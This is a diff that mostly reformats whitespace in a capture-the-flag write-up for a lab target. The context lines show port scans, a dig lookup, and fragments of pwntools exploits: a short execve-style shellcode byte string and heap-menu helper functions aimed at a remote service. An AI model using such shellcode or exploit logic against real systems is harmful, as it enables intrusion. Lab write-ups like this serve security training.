@@ -113,7 +113,8 @@ PORT     STATE SERVICE  VERSION
 |     Create a memo
 |     Show memo
 |_    Delete memo
-2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at
+https://nmap.org/cgi-bin/submit.cgi?new-service :
 ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
 SF-Port5555-TCP:V=7.98%I=7%D=1/30%Time=697C2031%P=x86_64-pc-linux-gnu%r(NU
 SF:LL,11,"enterx20yourx20name:n")%r(GenericLines,63,"enterx20yourx20n
@@ -201,14 +202,14 @@ That's a lot of info, but we can narrow it down as such:
 Port 9201 was found by the rustscan.
 
 ```list
-PORT     STATE SERVICE      REASON                                                                                                                          
-22/tcp   open  ssh          syn-ack ttl 63                                                                                                                  
-53/tcp   open  domain       syn-ack ttl 63                                                                                                                  
-80/tcp   open  http         syn-ack ttl 63                                                                                                                  
-2222/tcp open  EtherNetIP-1 syn-ack ttl 63                                                                                                                  
-5555/tcp open  freeciv      syn-ack ttl 63                                                                                                                  
-7777/tcp open  cbt          syn-ack ttl 63                                                                                                                  
-9201/tcp open  wap-wsp-wtp  syn-ack ttl 63 
+PORT     STATE SERVICE      REASON
+22/tcp   open  ssh          syn-ack ttl 63
+53/tcp   open  domain       syn-ack ttl 63
+80/tcp   open  http         syn-ack ttl 63
+2222/tcp open  EtherNetIP-1 syn-ack ttl 63
+5555/tcp open  freeciv      syn-ack ttl 63
+7777/tcp open  cbt          syn-ack ttl 63
+9201/tcp open  wap-wsp-wtp  syn-ack ttl 63
 ```
 
 
@@ -251,7 +252,8 @@ Finished
 Nothing from gobuster. Since, it hints us to dig in and the port 53 is for DNS, let's dig in using dig.
 
 ```bash
-kali@kali:dig @10.13.37.10 -x 10.13.37.10                                                                                                                         
+kali@kali:dig @10.13.37.10 -x 10.13.37.10
+
 ; <<>> DiG 9.20.15-2-Debian <<>> @10.13.37.10 -x 10.13.37.10
 ; (1 server found)
 ;; global options: +cmd
@@ -932,9 +934,9 @@ sys.stdout.buffer.write(data)
 leak = int(data.split(b"0x")[1].split()[0], 16)
 print(hex(leak))
 
-shellcode = (                                                                                                                                                
-   b"x31xc0x48xbbxd1x9dx96x91xd0x8cx97xff"                                                                                                      
-   b"x48xf7xdbx53x54x5fx99x52x57x54x5e"                                                                                                          
+shellcode = (
+   b"x31xc0x48xbbxd1x9dx96x91xd0x8cx97xff"
+   b"x48xf7xdbx53x54x5fx99x52x57x54x5e"
    b"xb0x3bx0fx05"                                                                                                                                      
 )
 
@@ -1402,16 +1404,16 @@ from pwn import remote, p64, p16
 
 shell = remote("10.13.37.10", 5555)
 
-def add(size, data):                                                                                                                                         
-   shell.sendlineafter(b"6. exit", b"1")                                                                                                                    
-   shell.sendlineafter(b"size:", str(size).encode())                                                                                                        
+def add(size, data):
+   shell.sendlineafter(b"6. exit", b"1")
+   shell.sendlineafter(b"size:", str(size).encode())
    shell.sendlineafter(b"username:", data)
 
-def edit(idx, mode, data):                                                                                                                                   
-   shell.sendline(b"2")                                                                                                                                     
-   shell.sendlineafter(b"2. insecure edit", str(mode).encode())                                                                                             
-   shell.sendlineafter(b"index:", str(idx).encode())                                                                                                        
-   shell.sendlineafter(b"username:", data)                                                                                                                  
+def edit(idx, mode, data):
+   shell.sendline(b"2")
+   shell.sendlineafter(b"2. insecure edit", str(mode).encode())
+   shell.sendlineafter(b"index:", str(idx).encode())
+   shell.sendlineafter(b"username:", data)
    shell.recvuntil(b"6. exit")
 
 def ban(idx):
@@ -1804,3 +1806,4 @@ This is the final flag, i.e. flag11
 *Flag11:JET{7.....7}*
 
 With this we wrap up the challenge. It took longer that expected because of too many pwn based ctf.
+
